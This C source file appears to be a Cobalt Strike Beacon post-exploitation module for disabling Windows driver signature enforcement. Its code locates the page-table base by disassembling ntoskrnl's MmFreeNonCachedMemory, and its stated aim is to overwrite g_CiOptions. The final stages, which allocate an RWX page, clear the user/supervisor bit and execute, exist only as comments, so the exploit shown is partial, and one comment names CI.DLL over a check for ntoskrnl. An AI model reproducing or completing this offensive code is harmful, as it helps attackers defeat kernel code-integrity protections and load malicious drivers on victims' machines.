/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Attempts to use the elevated thread to
 * to disable DSE by modifying the PTE
 * and overwriting g_CiOptions.
 *
**/

D_SEC( B ) VOID WINAPI DsePatchPte( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
{
	PVOID				Pte = NULL;
	PBYTE				Adr = NULL;
	PBYTE				Ptr = NULL;
	PVOID				Map = NULL;
	PCHAR				Str = NULL;
	ULONG				Len = 0;
	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;

	hde64s				Hde;
	RTL_OSVERSIONINFOW		Ver;

	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
	Ver.dwOSVersionInfoSize = sizeof( Ver );

	Api->RtlGetVersion( &Ver );

	/* Get size! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info length." ) ) );
		goto Leave;
	};

	/* Get ptrs! */
	if ( !( Inf = Api->LocalAlloc( LPTR, Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
		goto Leave;
	};

	/* Get info! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, Inf, Len, NULL ) >= 0 ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info." ) ) );
		goto Leave;
	};

	/* Enumerate modules! */
	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );

		/* Is CI.DLL? */
		if ( HashString( Str, 0 ) == H_STR_NTOSKRNL ) {

			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ntoskrnl.exe" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );

			if ( Map != NULL )
			{
				/* Greater than RS1 ! */
				if ( Ver.dwBuildNumber >= 14393 ) {
					Ptr = PeGetFuncEat( Map, H_STR_MMFREENONCACHEDMEMORY );

					if ( Ptr ) 
					{
						ULONG Off = 0;
						ULONG Rel = 0;

						do
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};
							if ( Hde.len == 5 ) {
								if ( Ptr[ Off ] == 0xE8 ) {
									Rel = *( ULONG * )( Ptr + Off + 1 );
									break;
								};
							};
							Off = Off + Hde.len;
						} while ( Off < 256 );

						Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
						Ptr = C_PTR( U_PTR( Inf->Module[ Idx ].ImageBase ) + ( U_PTR( Ptr ) - U_PTR( Map ) ) );
						Ptr = C_PTR( U_PTR( Ptr ) - 0x100000000 );

						if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), C_PTR( U_PTR( Ptr ) + 0x13 ), &Pte, sizeof( Pte ), NULL ) >= 0 ) ) {
							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte base." ) ) );
							goto Leave;
						};
					};
				} else {
					/* Static before RS1 */
					Pte = C_PTR( 0xFFFFF68000000000 );
				};

				if ( Pte != NULL ) {
					/* Allocate RWX Page! */
					/* Remove U/S BIT! */
					/* Execute! */
					/* Restore! */
				};
			} else {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ntoskrnl.exe" ) ) );
				goto Leave;
			};
		};
	};
Leave:
	if ( Inf != NULL ) {
		Api->LocalFree( Inf );
	};
	if ( Map != NULL ) {
		Api->FreeLibrary( Map );
	};
};
